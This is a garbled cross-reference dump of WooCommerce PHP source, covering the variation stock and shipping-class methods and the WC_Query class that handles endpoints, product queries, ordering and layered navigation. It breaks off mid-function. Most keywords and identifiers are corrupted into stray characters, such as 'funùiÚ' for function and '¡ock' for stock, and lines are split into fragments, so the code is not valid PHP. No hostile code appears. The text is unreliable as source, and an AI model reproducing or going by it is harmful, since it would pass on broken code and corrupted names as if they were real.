Ğ
$·»Á_id
, 
$size
 , 
$©Œ
);

356 
$image
 = 
	`wc_¶aûhŞd”_img
Ğ
$size
 );

359  
$image
;

360 
	}
}

369 
funùiÚ
 
	$£t_¡ock
Ğ
$amouÁ
 = 
nuÎ
, 
$fÜû_v¬ŸtiÚ_¡ock
 = 
çl£
 ) {

370 iàĞ
	`is_nuÎ
Ğ
$amouÁ
 ) )

373 iàĞ
$amouÁ
 ==ğ'' && 
$fÜû_v¬ŸtiÚ_¡ock
 ) {

376 
$this
->
v¬ŸtiÚ_has_¡ock
 = 
çl£
;

377 
$this
->
¡ock
 = '';

378 
	`un£t
Ğ
$this
->
mªage_¡ock
 );

381 
	`upd©e_po¡_m‘a
Ğ
$this
->
v¬ŸtiÚ_id
, '_stock', '' );

384 
WC_Produù_V¬ŸbË
::
	`sync
Ğ
$this
->
id
 );

386 } 
	`–£if
 ( 
$this
->
v¬ŸtiÚ_has_¡ock
 || 
$fÜû_v¬ŸtiÚ_¡ock
 ) {

389 
$this
->
¡ock
 = 
	`štv®
Ğ
$amouÁ
 );

390 
$this
->
v¬ŸtiÚ_has_¡ock
 = 
Œue
;

391 
$this
->
mªage_¡ock
 = 'yes';

394 
	`upd©e_po¡_m‘a
Ğ
$this
->
v¬ŸtiÚ_id
, '_¡ock', $this->
¡ock
 );

397 
	`d–‘e_Œªs›Á
Ğ'wc_´oduù_tÙ®_¡ock_' . 
$this
->
id
 );

400 iàĞ! 
$this
->
	`is_š_¡ock
() ) {

403 
$·»Á_´oduù
 = 
	`g‘_´oduù
Ğ
$this
->
id
 );

406 iàĞ! 
$·»Á_´oduù
->
	`backÜd”s_®lowed
(è&& $·»Á_´oduù->
	`g‘_tÙ®_¡ock
(è<ğ
	`g‘_İtiÚ
( 'woocommerce_notify_no_stock_amount' ) ) {

408 
$®l_mªaged
 = 
Œue
;

410 iàĞĞ
$·»Á_´oduù
->
	`g‘_chd»n
() ) > 0 ) {

411 
	`fÜ—ch
 ( 
$·»Á_´oduù
->
	`g‘_chd»n
(è
as
 
$chd_id
 ) {

412 
$¡ock
 = 
	`g‘_po¡_m‘a
Ğ
$chd_id
, '_¡ock', 
Œue
 );

413 iàĞ
$¡ock
 == '' ) {

414 
$®l_mªaged
 = 
çl£
;

420 iàĞ
$®l_mªaged
 ) {

421 
$this
->
	`£t_¡ock_¡©us
( 'outofstock' );

425 } 
	`–£if
 ( 
$this
->
	`is_š_¡ock
() ) {

426 
$this
->
	`£t_¡ock_¡©us
( 'instock' );

430 
WC_Produù_V¬ŸbË
::
	`sync
Ğ
$this
->
id
 );

433 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_£t_¡ock', 
$this
 );

435  
$this
->
	`g‘_¡ock_quªt™y
();

439  
·»Á
::
	`£t_¡ock
Ğ
$amouÁ
 );

442 
	}
}

450 
public
 
funùiÚ
 
	$»duû_¡ock
Ğ
$by
 = 1 ) {

451 iàĞ
$this
->
v¬ŸtiÚ_has_¡ock
 ) {

452  
$this
->
	`£t_¡ock
Ğ$this->
¡ock
 - 
$by
 );

454  
·»Á
::
	`»duû_¡ock
Ğ
$by
 );

456 
	}
}

464 
public
 
funùiÚ
 
	$šü—£_¡ock
Ğ
$by
 = 1 ) {

465 iàĞ
$this
->
v¬ŸtiÚ_has_¡ock
 ) {

466  
$this
->
	`£t_¡ock
Ğ$this->
¡ock
 + 
$by
 );

468  
·»Á
::
	`šü—£_¡ock
Ğ
$by
 );

470 
	}
}

478 
public
 
funùiÚ
 
	$g‘_shpšg_şass
() {

479 iàĞ! 
$this
->
v¬ŸtiÚ_shpšg_şass
 ) {

480 
$şas£s
 = 
	`g‘_the_‹rms
Ğ
$this
->
v¬ŸtiÚ_id
, 'product_shipping_class' );

482 iàĞ
$şas£s
 && ! 
	`is_wp_”rÜ
( $classes ) ) {

483 
$this
->
v¬ŸtiÚ_shpšg_şass
 = 
	`esc_©Œ
Ğ
	`cu¼’t
Ğ
$şas£s
 )->
¦ug
 );

485 
$this
->
v¬ŸtiÚ_shpšg_şass
 = 
·»Á
::
	`g‘_shpšg_şass
();

489  
$this
->
v¬ŸtiÚ_shpšg_şass
;

490 
	}
}

498 
public
 
funùiÚ
 
	$g‘_shpšg_şass_id
() {

499 iàĞ! 
$this
->
v¬ŸtiÚ_shpšg_şass_id
 ) {

501 
$şas£s
 = 
	`g‘_the_‹rms
Ğ
$this
->
v¬ŸtiÚ_id
, 'product_shipping_class' );

503 iàĞ
$şas£s
 && ! 
	`is_wp_”rÜ
( $classes ) )

504 
$this
->
v¬ŸtiÚ_shpšg_şass_id
 = 
	`cu¼’t
Ğ
$şas£s
 )->
‹rm_id
;

506 
$this
->
v¬ŸtiÚ_shpšg_şass_id
 = 
·»Á
::
	`g‘_shpšg_şass_id
();

509  
	`absšt
Ğ
$this
->
v¬ŸtiÚ_shpšg_şass_id
 );

510 
	}
}

519 
public
 
funùiÚ
 
	$g‘_fÜm©‹d_Çme
() {

521 iàĞ
$this
->
	`g‘_sku
() )

522 
$id’tif›r
 = 
$this
->
	`g‘_sku
();

524 
$id’tif›r
 = '#' . 
$this
->
v¬ŸtiÚ_id
;

526 
$©Œibu‹s
 = 
$this
->
	`g‘_v¬ŸtiÚ_©Œibu‹s
();

527 
$exŒa_d©a
 = ' &ndash; ' . 
	`im¶ode
Ğ', ', 
$©Œibu‹s
 ) . ' &ndash; ' . 
	`wc_´iû
Ğ
$this
->
	`g‘_´iû
() );

529  
	`¥rštf
Ğ
	`__
Ğ'% &ndash; %s%s', 'woocomm”û' ), 
$id’tif›r
, 
$this
->
	`g‘_t™Ë
(), 
$exŒa_d©a
 );

530 
	}
}

	@includes/class-wc-query.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 iàĞ! 
şass_exi¡s
( 'WC_Query' ) ) :

19 şas 
	cWC_Qu”y
 {

22 
public
 
$qu”y_v¬s
 = 
¬¿y
();

25 
public
 
	m$unf‹»d_´oduù_ids
 = 
¬¿y
();

28 
public
 
	m$f‹»d_´oduù_ids
 = 
¬¿y
();

31 
public
 
	m$f‹»d_´oduù_ids_fÜ_xÚomy
 = 
¬¿y
();

34 
public
 
	m$po¡__š
 = 
¬¿y
();

37 
public
 
	m$m‘a_qu”y
 = '';

40 
public
 
	m$Ïy”ed_Çv_po¡__š
 = 
¬¿y
();

43 
public
 
	m$Ïy”ed_Çv_´oduù_ids
 = 
¬¿y
();

50 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

51 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'add_endpoints' ) );

52 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'layered_nav_init' ) );

53 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'price_filter_init' ) );

55 iàĞ! 
	`is_admš
() ) {

56 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'get_errors' ) );

57 
	`add_f‹r
Ğ'qu”y_v¬s', 
	`¬¿y
Ğ
$this
, 'add_query_vars'), 0 );

58 
	`add_aùiÚ
Ğ'·r£_»que¡', 
	`¬¿y
Ğ
$this
, 'parse_request'), 0 );

59 
	`add_f‹r
Ğ'´e_g‘_po¡s', 
	`¬¿y
Ğ
$this
, 'pre_get_posts' ) );

60 
	`add_f‹r
Ğ'the_po¡s', 
	`¬¿y
Ğ
$this
, 'the_posts' ), 11, 2 );

61 
	`add_aùiÚ
Ğ'wp', 
	`¬¿y
Ğ
$this
, 'remove_product_query' ) );

62 
	`add_aùiÚ
Ğ'wp', 
	`¬¿y
Ğ
$this
, 'remove_ordering_args' ) );

65 
$this
->
	`š™_qu”y_v¬s
();

71 
public
 
funùiÚ
 
	$š™_qu”y_v¬s
() {

73 
$this
->
qu”y_v¬s
 = 
	`¬¿y
(

75 'Üd”-·y' => 
	`g‘_İtiÚ
( 'woocommerce_checkout_pay_endpoint', 'order-pay' ),

76 'Üd”-»ûived' => 
	`g‘_İtiÚ
( 'woocommerce_checkout_order_received_endpoint', 'order-received' ),

79 'v›w-Üd”' => 
	`g‘_İtiÚ
( 'woocommerce_myaccount_view_order_endpoint', 'view-order' ),

80 'ed™-accouÁ' => 
	`g‘_İtiÚ
( 'woocommerce_myaccount_edit_account_endpoint', 'edit-account' ),

81 'ed™-add»ss' => 
	`g‘_İtiÚ
( 'woocommerce_myaccount_edit_address_endpoint', 'edit-address' ),

82 'lo¡-·sswÜd' => 
	`g‘_İtiÚ
( 'woocommerce_myaccount_lost_password_endpoint', 'lost-password' ),

83 'cu¡om”-logout' => 
	`g‘_İtiÚ
( 'woocommerce_logout_endpoint', 'customer-logout' ),

84 'add-·ym’t-m‘hod' => 
	`g‘_İtiÚ
( 'woocommerce_myaccount_add_payment_method_endpoint', 'add-payment-method' ),

86 
	}
}

91 
public
 
funùiÚ
 
	$g‘_”rÜs
() {

92 iàĞ! 
	`em±y
Ğ
$_GET
['wc_”rÜ'] ) && ( 
$”rÜ
 = 
	`§n™ize_‹xt_f›ld
Ğ$_GET['wc_”rÜ'] ) ) && ! 
	`wc_has_nÙiû
( $error, 'error' ) )

93 
	`wc_add_nÙiû
Ğ
$”rÜ
, 'error' );

94 
	}
}

99 
public
 
funùiÚ
 
	$add_’dpošts
() {

100 
	`fÜ—ch
 ( 
$this
->
qu”y_v¬s
 
as
 
$key
 => 
$v¬
 )

101 
	`add_»wr™e_’dpošt
Ğ
$v¬
, 
EP_PAGES
 );

102 
	}
}

111 
public
 
funùiÚ
 
	$add_qu”y_v¬s
Ğ
$v¬s
 ) {

112 
	`fÜ—ch
 ( 
$this
->
qu”y_v¬s
 
as
 
$key
 => 
$v¬
 )

113 
$v¬s
[] = 
$key
;

115  
$v¬s
;

116 
	}
}

122 
public
 
funùiÚ
 
	$g‘_qu”y_v¬s
() {

123  
$this
->
qu”y_v¬s
;

124 
	}
}

129 
public
 
funùiÚ
 
	$·r£_»que¡
() {

130 
glob®
 
$wp
;

133 
	`fÜ—ch
 ( 
$this
->
qu”y_v¬s
 
as
 
$key
 => 
$v¬
 ) {

134 iàĞ
	`is£t
Ğ
$_GET
[ 
$v¬
 ] ) ) {

135 
$wp
->
qu”y_v¬s
[ 
$key
 ] = 
$_GET
[ 
$v¬
 ];

138 
	`–£if
 ( 
	`is£t
Ğ
$wp
->
qu”y_v¬s
[ 
$v¬
 ] ) ) {

139 
$wp
->
qu”y_v¬s
[ 
$key
 ] = $wp->qu”y_v¬s[ 
$v¬
 ];

142 
	}
}

151 
public
 
funùiÚ
 
	$´e_g‘_po¡s
Ğ
$q
 ) {

153 iàĞ! 
$q
->
	`is_maš_qu”y
() )

157 iàĞ
$q
->
	`is_home
(è&& '·ge' =ğ
	`g‘_İtiÚ
('show_Ú_äÚt'è&& g‘_İtiÚ('·ge_Ú_äÚt'è=ğ
	`wc_g‘_·ge_id
('shop') ) {

158 
$_qu”y
 = 
	`wp_·r£_¬gs
Ğ
$q
->
qu”y
 );

159 iàĞ
	`em±y
Ğ
$_qu”y
 ) || ! 
	`¬¿y_diff
Ğ
	`¬¿y_keys
Ğ$_qu”y ), 
	`¬¿y
( 'preview', 'page', 'paged', 'cpage', 'orderby' ) ) ) {

160 
$q
->
is_·ge
 = 
Œue
;

161 
$q
->
is_home
 = 
çl£
;

162 
$q
->
	`£t
Ğ'·ge_id', 
	`g‘_İtiÚ
('page_on_front') );

163 
$q
->
	`£t
( 'post_type', 'product' );

168 iàĞ
$q
->
	`is_·ge
(è&& '·ge' =ğ
	`g‘_İtiÚ
Ğ'show_Ú_äÚt' ) && $q->
	`g‘
('·ge_id'è=ğ
	`wc_g‘_·ge_id
('shop') ) {

171 
$q
->
	`£t
( 'post_type', 'product' );

172 
$q
->
	`£t
( 'page_id', '' );

173 iàĞ
	`is£t
Ğ
$q
->
qu”y
['paged'] ) )

174 
$q
->
	`£t
Ğ'·ged', $q->
qu”y
['paged'] );

177 
	`defše
Ğ'SHOP_IS_ON_FRONT', 
Œue
 );

181 
glob®
 
$wp_po¡_ty³s
;

183 
$shİ_·ge
 = 
	`g‘_po¡
Ğ
	`wc_g‘_·ge_id
('shop') );

184 
$q
->
is_·ge
 = 
Œue
;

186 
$wp_po¡_ty³s
['´oduù']->
ID
 = 
$shİ_·ge
->ID;

187 
$wp_po¡_ty³s
['´oduù']->
po¡_t™Ë
 = 
$shİ_·ge
->post_title;

188 
$wp_po¡_ty³s
['´oduù']->
po¡_Çme
 = 
$shİ_·ge
->post_name;

191 
$q
->
is_sšguÏr
 = 
çl£
;

192 
$q
->
is_po¡_ty³_¬chive
 = 
Œue
;

193 
$q
->
is_¬chive
 = 
Œue
;

196 iàĞ
	`funùiÚ_exi¡s
( 'wpseo_get_value' ) ) {

197 
	`add_f‹r
Ğ'wp£o_m‘adesc', 
	`¬¿y
Ğ
$this
, 'wpseo_metadesc' ) );

198 
	`add_f‹r
Ğ'wp£o_m‘akey', 
	`¬¿y
Ğ
$this
, 'wpseo_metakey' ) );

204 iàĞ! 
$q
->
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && ! $q->
	`is_x
Ğ
	`g‘_objeù_xÚom›s
( 'product' ) ) )

209 
$this
->
	`´oduù_qu”y
Ğ
$q
 );

211 iàĞ
	`is_£¬ch
() ) {

212 
	`add_f‹r
Ğ'po¡s_wh”e', 
	`¬¿y
Ğ
$this
, 'search_post_excerpt' ) );

213 
	`add_f‹r
Ğ'wp', 
	`¬¿y
Ğ
$this
, 'remove_posts_where' ) );

216 
	`add_f‹r
Ğ'po¡s_wh”e', 
	`¬¿y
Ğ
$this
, 'exclude_protected_products' ) );

219 
	`add_aùiÚ
Ğ'wp', 
	`¬¿y
Ğ
$this
, 'get_products_in_view' ), 2);

222 
$this
->
	`»move_´oduù_qu”y
();

223 
	}
}

232 
public
 
funùiÚ
 
£¬ch_po¡_exû½t
Ğ
$wh”e
 = '' ) {

233 
glob®
 
$wp_the_qu”y
;

236 iàĞ
em±y
Ğ
$wp_the_qu”y
->
qu”y_v¬s
['wc_query'] ) ||ƒmpty( $wp_the_query->query_vars['s'] ) )

237  
	g$wh”e
;

239 
	g$wh”e
 = 
´eg_»¶aû
(

241 "po¡_t™Ë LIKE $1èOR (po¡_exû½ˆLIKE $1", 
$wh”e
 );

243  
	g$wh”e
;

252 
public
 
funùiÚ
 
	$exşude_´Ùeùed_´oduùs
Ğ
$wh”e
 ) {

253 
glob®
 
$wpdb
;

254 
$wh”e
 .= " AND {$wpdb->posts}.post_password = ''";

255  
$wh”e
;

256 
	}
}

265 
public
 
funùiÚ
 
	$wp£o_m‘adesc
() {

266  
	`wp£o_g‘_v®ue
Ğ'm‘adesc', 
	`wc_g‘_·ge_id
('shop') );

267 
	}
}

277 
public
 
funùiÚ
 
	$wp£o_m‘akey
() {

278  
	`wp£o_g‘_v®ue
Ğ'm‘akey', 
	`wc_g‘_·ge_id
('shop') );

279 
	}
}

290 
public
 
funùiÚ
 
	$the_po¡s
Ğ
$po¡s
, 
$qu”y
 = 
çl£
 ) {

292 iàĞ! 
$qu”y
 )

293  
$po¡s
;

296 iàĞ
	`em±y
Ğ
$this
->
po¡__š
 ) )

297  
$po¡s
;

300 iàĞ! 
	`em±y
Ğ
$qu”y
->
wc_qu”y
 ) )

301  
$po¡s
;

304 iàĞ
	`em±y
Ğ
$qu”y
->
qu”y_v¬s
["s"] ) )

305  
$po¡s
;

308 iàĞ! 
$qu”y
->
	`is_po¡_ty³_¬chive
Ğ'´oduù' ) && ! $qu”y->
	`is_x
Ğ
	`g‘_objeù_xÚom›s
( 'product' ) ) )

309  
$po¡s
;

311 
$f‹»d_po¡s
 = 
	`¬¿y
();

312 
$qu”›d_po¡_ids
 = 
	`¬¿y
();

314 
	`fÜ—ch
 ( 
$po¡s
 
as
 
$po¡
 ) {

315 iàĞ
	`š_¬¿y
Ğ
$po¡
->
ID
, 
$this
->
po¡__š
 ) ) {

316 
$f‹»d_po¡s
[] = 
$po¡
;

317 
$qu”›d_po¡_ids
[] = 
$po¡
->
ID
;

321 
$qu”y
->
po¡s
 = 
$f‹»d_po¡s
;

322 
$qu”y
->
po¡_couÁ
 = 
	`couÁ
Ğ
$f‹»d_po¡s
 );

325 
$this
->
unf‹»d_´oduù_ids
 = 
$qu”›d_po¡_ids
;

326 
$this
->
f‹»d_´oduù_ids
 = 
$qu”›d_po¡_ids
;

328 iàĞĞ
$this
->
Ïy”ed_Çv_po¡__š
 ) > 0 ) {

329 
$this
->
Ïy”ed_Çv_´oduù_ids
 = 
	`¬¿y_š‹r£ù
Ğ$this->
unf‹»d_´oduù_ids
, $this->
Ïy”ed_Çv_po¡__š
 );

331 
$this
->
Ïy”ed_Çv_´oduù_ids
 = $this->
unf‹»d_´oduù_ids
;

334  
$f‹»d_po¡s
;

335 
	}
}

345 
public
 
funùiÚ
 
	$´oduù_qu”y
Ğ
$q
 ) {

348 
$m‘a_qu”y
 = 
$this
->
	`g‘_m‘a_qu”y
Ğ
$q
->
	`g‘
( 'meta_query' ) );

351 
$Üd”šg
 = 
$this
->
	`g‘_ÿlog_Üd”šg_¬gs
();

354 
$po¡__š
 = 
	`¬¿y_unique
Ğ
	`­¶y_f‹rs
Ğ'loİ_shİ_po¡_š', 
	`¬¿y
() ) );

357 
$q
->
	`£t
Ğ'Üd”by', 
$Üd”šg
['orderby'] );

358 
$q
->
	`£t
Ğ'Üd”', 
$Üd”šg
['order'] );

359 iàĞ
	`is£t
Ğ
$Üd”šg
['meta_key'] ) )

360 
$q
->
	`£t
Ğ'm‘a_key', 
$Üd”šg
['meta_key'] );

363 
$q
->
	`£t
Ğ'm‘a_qu”y', 
$m‘a_qu”y
 );

364 
$q
->
	`£t
Ğ'po¡__š', 
$po¡__š
 );

365 
$q
->
	`£t
Ğ'po¡s_³r_·ge', $q->
	`g‘
Ğ'po¡s_³r_·ge' ) ? $q->g‘Ğ'po¡s_³r_·ge' ) : 
	`­¶y_f‹rs
Ğ'loİ_shİ_³r_·ge', 
	`g‘_İtiÚ
( 'posts_per_page' ) ) );

368 
$q
->
	`£t
Ğ'wc_qu”y', 
Œue
 );

371 
$this
->
po¡__š
 = 
$po¡__š
;

372 
$this
->
m‘a_qu”y
 = 
$m‘a_qu”y
;

374 
	`do_aùiÚ
Ğ'woocomm”û_´oduù_qu”y', 
$q
, 
$this
 );

375 
	}
}

384 
public
 
funùiÚ
 
	$»move_´oduù_qu”y
() {

385 
	`»move_f‹r
Ğ'´e_g‘_po¡s', 
	`¬¿y
Ğ
$this
, 'pre_get_posts' ) );

386 
	}
}

391 
public
 
funùiÚ
 
	$»move_Üd”šg_¬gs
() {

392 
	`»move_f‹r
Ğ'po¡s_şau£s', 
	`¬¿y
Ğ
$this
, 'order_by_popularity_post_clauses' ) );

393 
	`»move_f‹r
Ğ'po¡s_şau£s', 
	`¬¿y
Ğ
$this
, 'order_by_rating_post_clauses' ) );

394 
	}
}

402 
public
 
funùiÚ
 
	$»move_po¡s_wh”e
() {

403 
	`»move_f‹r
Ğ'po¡s_wh”e', 
	`¬¿y
Ğ
$this
, 'search_post_excerpt' ) );

404 
	}
}

413 
public
 
funùiÚ
 
	$g‘_´oduùs_š_v›w
() {

414 
glob®
 
$wp_the_qu”y
;

416 
$unf‹»d_´oduù_ids
 = 
	`¬¿y
();

419 
$cu¼’t_wp_qu”y
 = 
$wp_the_qu”y
->
qu”y
;

422 
	`un£t
Ğ
$cu¼’t_wp_qu”y
['paged'] );

425 
$Œªs›Á_Çme
 = 'wc_uf_pid_' . 
	`md5
Ğ
	`h‰p_bud_qu”y
Ğ
$cu¼’t_wp_qu”y
 ) );

426 
$Œªs›Á_Çme
 = ( 
	`is_£¬ch
() ) ? $transient_name . '_s' : $transient_name;

428 iàĞ
çl£
 ==ğĞ
$unf‹»d_´oduù_ids
 = 
	`g‘_Œªs›Á
Ğ
$Œªs›Á_Çme
 ) ) ) {

431 
$unf‹»d_´oduù_ids
 = 
	`g‘_po¡s
(

432 
	`¬¿y_m”ge
(

433 
$cu¼’t_wp_qu”y
,

434 
	`¬¿y
(

438 'm‘a_qu”y' => 
$this
->
m‘a_qu”y
,

440 'no_found_rows' => 
Œue
,

441 'upd©e_po¡_m‘a_ÿche' => 
çl£
,

442 'upd©e_po¡_‹rm_ÿche' => 
çl£


447 
	`£t_Œªs›Á
Ğ
$Œªs›Á_Çme
, 
$unf‹»d_´oduù_ids
, 
YEAR_IN_SECONDS
 );

451 
$this
->
unf‹»d_´oduù_ids
 = 
$unf‹»d_´oduù_ids
;

454 iàĞĞ
$this
->
po¡__š
 ) > 0 )

455 
$this
->
f‹»d_´oduù_ids
 = 
	`¬¿y_š‹r£ù
Ğ$this->
unf‹»d_´oduù_ids
, $this->
po¡__š
 );

457 
$this
->
f‹»d_´oduù_ids
 = $this->
unf‹»d_´oduù_ids
;

460 iàĞĞ
$this
->
Ïy”ed_Çv_po¡__š
 ) > 0 )

461 
$this
->
Ïy”ed_Çv_´oduù_ids
 = 
	`¬¿y_š‹r£ù
Ğ$this->
unf‹»d_´oduù_ids
, $this->
Ïy”ed_Çv_po¡__š
 );

463 
$this
->
Ïy”ed_Çv_´oduù_ids
 = $this->
unf‹»d_´oduù_ids
;

464 
	}
}

473 
public
 
funùiÚ
 
g‘_ÿlog_Üd”šg_¬gs
Ğ
$Üd”by
 = '', 
$Üd”
 = '' ) {

475 iàĞ! 
$Üd”by
 ) {

476 
$Üd”by_v®ue
 = 
is£t
Ğ
$_GET
['Üd”by'] ) ? 
wc_ş—n
Ğ$_GET['Üd”by'] ) : 
­¶y_f‹rs
Ğ'woocomm”û_deçuÉ_ÿlog_Üd”by', 
g‘_İtiÚ
( 'woocommerce_default_catalog_orderby' ) );

479 
	g$Üd”by_v®ue
 = 
ex¶ode
Ğ'-', 
$Üd”by_v®ue
 );

480 
	g$Üd”by
 = 
esc_©Œ
Ğ
$Üd”by_v®ue
[0] );

481 
	g$Üd”
 = ! 
em±y
Ğ
$Üd”by_v®ue
[1] ) ? $Üd”by_v®ue[1] : 
$Üd”
;

484 
	g$Üd”by
 = 
¡¹Şow”
Ğ
$Üd”by
 );

485 
	g$Üd”
 = 
¡¹ouµ”
Ğ
$Üd”
 );

487 
	g$¬gs
 = 
¬¿y
();

490 
	g$¬gs
['orderby'] = 'menu_orderitle';

491 
	g$¬gs
['Üd”'] = 
$Üd”
 == 'DESC' ? 'DESC' : 'ASC';

492 
	g$¬gs
['meta_key'] = '';

494  
	g$Üd”by
 ) {

496 
$¬gs
['orderby'] = 'rand';

499 
$¬gs
['orderby'] = 'date';

500 
	g$¬gs
['Üd”'] = 
$Üd”
 == 'ASC' ? 'ASC' : 'DESC';

503 
$¬gs
['orderby'] = 'meta_value_num';

504 
	g$¬gs
['Üd”'] = 
$Üd”
 == 'DESC' ? 'DESC' : 'ASC';

505 
	g$¬gs
['meta_key'] = '_price';

508 
$¬gs
['meta_key'] = 'total_sales';

511 
add_f‹r
Ğ'po¡s_şau£s', 
¬¿y
Ğ
$this
, 'order_by_popularity_post_clauses' ) );

515 
add_f‹r
Ğ'po¡s_şau£s', 
¬¿y
Ğ
$this
, 'order_by_rating_post_clauses' ) );

518 
$¬gs
['orderby'] = 'title';

519 
	g$¬gs
['Üd”'] = 
$Üd”
 == 'DESC' ? 'DESC' : 'ASC';

523  
­¶y_f‹rs
Ğ'woocomm”û_g‘_ÿlog_Üd”šg_¬gs', 
$¬gs
 );

535 
public
 
funùiÚ
 
	$Üd”_by_pİuÏr™y_po¡_şau£s
Ğ
$¬gs
 ) {

536 
glob®
 
$wpdb
;

538 
$¬gs
['orderby'] = "$wpdb->postmeta.meta_value+0 DESC, $wpdb->posts.post_date DESC";

540  
$¬gs
;

541 
	}
}

550 
public
 
funùiÚ
 
	$Üd”_by_¿tšg_po¡_şau£s
Ğ
$¬gs
 ) {

551 
glob®
 
$wpdb
;

553 
$¬gs
['fields'] .= ", AVG( $wpdb->commentmeta.meta_value )‡s‡verage_rating ";

555 
$¬gs
['where'] .= " AND ( $wpdb->commentmeta.meta_key = 'rating' OR $wpdb->commentmeta.meta_key IS‚ull ) ";

557 
$¬gs
['join'] .= "

558 
LEFT
 
OUTER
 
JOIN
 
$wpdb
->
comm’ts
 
	`ON
($wpdb->
po¡s
.
ID
 = $wpdb->comm’ts.
comm’t_po¡_ID
)

559 
LEFT
 
JOIN
 
$wpdb
->
comm’tm‘a
 
	`ON
($wpdb->
comm’ts
.
comm’t_ID
 = $wpdb->comm’tm‘a.
comm’t_id
)

562 
$¬gs
['orderby'] = "average_rating DESC, $wpdb->posts.post_date DESC";

564 
$¬gs
['groupby'] = "$wpdb->posts.ID";

566  
$¬gs
;

567 
	}
}

575 
public
 
funùiÚ
 
g‘_m‘a_qu”y
Ğ
$m‘a_qu”y
 = 
	$¬¿y
() ) {

576 iàĞ! 
	`is_¬¿y
Ğ
$m‘a_qu”y
 ) )

577 
$m‘a_qu”y
 = 
	`¬¿y
();

579 
$m‘a_qu”y
[] = 
$this
->
	`visib™y_m‘a_qu”y
();

580 
$m‘a_qu”y
[] = 
$this
->
	`¡ock_¡©us_m‘a_qu”y
();

582  
	`¬¿y_f‹r
Ğ
$m‘a_qu”y
 );

583 
	}
}

592 
public
 
funùiÚ
 
visib™y_m‘a_qu”y
Ğ
$com·»
 = 'IN' ) {

593 iàĞ
is_£¬ch
() )

594 
$š
 = 
¬¿y
( 'visible', 'search' );

596 
	g$š
 = 
¬¿y
( 'visible', 'catalog' );

598 
	g$m‘a_qu”y
 = 
¬¿y
(

600 'v®ue' => 
$š
,

601 'com·»' => 
$com·»


604  
	g$m‘a_qu”y
;

614 
public
 
funùiÚ
 
¡ock_¡©us_m‘a_qu”y
Ğ
$¡©us
 = 'instock' ) {

615 
$m‘a_qu”y
 = 
¬¿y
();

616 iàĞ
g‘_İtiÚ
( 'woocommerce_hide_out_of_stock_items' ) == 'yes' ) {

617 
$m‘a_qu”y
 = 
¬¿y
(

619 'v®ue' => 
$¡©us
,

623  
	g$m‘a_qu”y
;

629 
public
 
funùiÚ
 
	$Ïy”ed_Çv_š™
( ) {

631 iàĞ
	`is_aùive_widg‘
Ğ
çl£
, f®£, 'woocomm”û_Ïy”ed_Çv', 
Œue
 ) && ! 
	`is_admš
() ) {

633 
glob®
 
$_cho£n_©Œibu‹s
;

635 
$_cho£n_©Œibu‹s
 = 
	`¬¿y
();

637 
$©Œibu‹_xÚom›s
 = 
	`wc_g‘_©Œibu‹_xÚom›s
();

638 iàĞ
$©Œibu‹_xÚom›s
 ) {

639 
	`fÜ—ch
 ( 
$©Œibu‹_xÚom›s
 
as
 
$x
 ) {

641 
$©Œibu‹
 = 
	`wc_§n™ize_xÚomy_Çme
Ğ
$x
->
©Œibu‹_Çme
 );

642 
$xÚomy
 = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$©Œibu‹
 );

643 
$Çme
 = 'f‹r_' . 
$©Œibu‹
;

644 
$qu”y_ty³_Çme
 = 'qu”y_ty³_' . 
$©Œibu‹
;

646 iàĞ! 
	`em±y
Ğ
$_GET
[ 
$Çme
 ] ) && 
	`xÚomy_exi¡s
Ğ
$xÚomy
 ) ) {

648 
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ]['‹rms'] = 
	`ex¶ode
Ğ',', 
$_GET
[ 
$Çme
 ] );

650 iàĞ
	`em±y
Ğ
$_GET
[ 
$qu”y_ty³_Çme
 ] ) || ! 
	`š_¬¿y
Ğ
	`¡¹Şow”
Ğ$_GET[ $qu”y_ty³_Çm] ), 
	`¬¿y
( 'and', 'or' ) ) )

651 
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ]['qu”y_ty³'] = 
	`­¶y_f‹rs
( 'woocommerce_layered_nav_default_query_type', 'and' );

653 
$_cho£n_©Œibu‹s
[ 
$xÚomy
 ]['qu”y_ty³'] = 
	`¡¹Şow”
Ğ
$_GET
[ 
$qu”y_ty³_Çme
 ] );

659 
	`add_f‹r
('loİ_shİ_po¡_š', 
	`¬¿y
Ğ
$this
, 'layered_nav_query' ) );

661 
	}
}

669 
public
 
funùiÚ
 
	$Ïy”ed_Çv_qu”y
Ğ
$f‹»d_po¡s
 ) {

670 
glob®
 
$_cho£n_©Œibu‹s
, 
$wp_qu”y
;

672 iàĞĞ
$_cho£n_©Œibu‹s
 ) > 0 ) {

674 
$m©ched_´oduùs
 = 
	`¬¿y
(

675 'ªd' => 
	`¬¿y
(),

676 'Ü' => 
	`¬¿y
()

678 
$f‹»d_©Œibu‹
 = 
	`¬¿y
(

679 'ªd' => 
çl£
,

680 'Ü' => 
çl£


683 
	`fÜ—ch
 ( 
$_cho£n_©Œibu‹s
 
as
 
$©Œibu‹
 => 
$d©a
 ) {

684 
$m©ched_´oduùs_äom_©Œibu‹
 = 
	`¬¿y
();

685 
$f‹»d
 = 
çl£
;

687 iàĞĞ
$d©a
['terms'] ) > 0 ) {

688 
	`fÜ—ch
 ( 
$d©a
['‹rms'] 
as
 
$v®ue
 ) {

690 
$po¡s
 = 
	`g‘_po¡s
(

691 
	`¬¿y
(

696 'no_found_rows' => 
Œue
,

697 'x_qu”y' => 
	`¬¿y
(

698 
	`¬¿y
(

699 'xÚomy' => 
$©Œibu‹
,

700 '‹rms' => 
$v®ue
,

707 iàĞ! 
	`is_wp_”rÜ
Ğ
$po¡s
 ) ) {

709 iàĞĞ
$m©ched_´oduùs_äom_©Œibu‹
 ) > 0 || 
$f‹»d
 )

710 
$m©ched_´oduùs_äom_©Œibu‹
 = 
$d©a
['qu”y_ty³'] =ğ'Ü' ? 
	`¬¿y_m”ge
Ğ
$po¡s
, $m©ched_´oduùs_äom_©Œibu‹ ) : 
	`¬¿y_š‹r£ù
